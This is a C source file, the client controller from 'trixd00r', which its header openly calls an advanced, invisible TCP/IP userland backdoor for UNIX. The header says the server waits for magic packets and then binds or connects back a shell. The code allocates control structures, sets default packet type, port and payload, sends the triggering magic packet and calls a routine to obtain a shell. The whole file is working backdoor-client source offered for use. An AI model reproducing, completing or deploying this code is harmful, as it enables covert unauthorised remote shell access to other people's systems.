/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * client/src/controller.c                                                     *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "controller.h"
#include "wrapper.h"
#include "verbose.h"
#include "signals.h"


/* just free everything we have to free */
void free_trixd00r(ctrl_t *ctrl)
{
    if (ctrl->packet->magic_packet != NULL) {
        free(ctrl->packet->magic_packet);
    }
    if (ctrl->packet != NULL) {
        free(ctrl->packet);
    }
    if (ctrl != NULL) {
        free(ctrl);
    }

    return;
}


/* ignore or handle some signals */
void install_signals()
{
    /*xsignal(SIGTERM, SIG_IGN);
    xsignal(SIGHUP, SIG_IGN);
    xsignal(SIGINT, SIG_IGN);
    xsignal(SIGUSR1, SIG_IGN);
    xsignal(SIGUSR2, SIG_IGN);*/

    /* here we do not ignore SIGCHLD, because we need to be without zombies */
    xsignal(SIGCHLD, sig_chld);

    return;
}


/* allocate buffer for each struct and fill in with zeros */
ctrl_t *alloc_structs()
{
    ctrl_t *ctrl = NULL;


    ctrl = (ctrl_t *) alloc_buff(sizeof(ctrl_t));
    ctrl->packet = (packet_t *) alloc_buff(sizeof(packet_t));
    ctrl->packet->magic_packet = (char *) alloc_buff(1500);
    ctrl->shell = (shell_t *) alloc_buff(sizeof(shell_t));

    return ctrl;
}


/* default settings for ctrl_t {} - prior to our complete definition */
ctrl_t *set_ctrl_defaults(ctrl_t *ctrl)
{
    ctrl->packet->type = DEF_TYPE;
    ctrl->shell->mode = DEF_MODE;
    ctrl->packet->port = DEF_PORT;
    ctrl->packet->payload = DEF_PAYLOAD;
    ctrl->verbose = QUIET;

    return ctrl;
}


/* end of trixd00r */
void end_trixd00r(ctrl_t *ctrl)
{
    free_trixd00r(ctrl);

    return;
}


/* begin of trixd00r */
void start_trixd00r(ctrl_t *ctrl)
{
    __VERBOSE_BUILD;
    build_packet(ctrl->packet);
    
    __VERBOSE_SEND;
    send_packet(ctrl->packet);

    ctrl->shell->packet = ctrl->packet;
    ctrl->packet->verbose = ctrl->verbose;
    get_shell(ctrl->shell);

    return;
}

/* EOF */
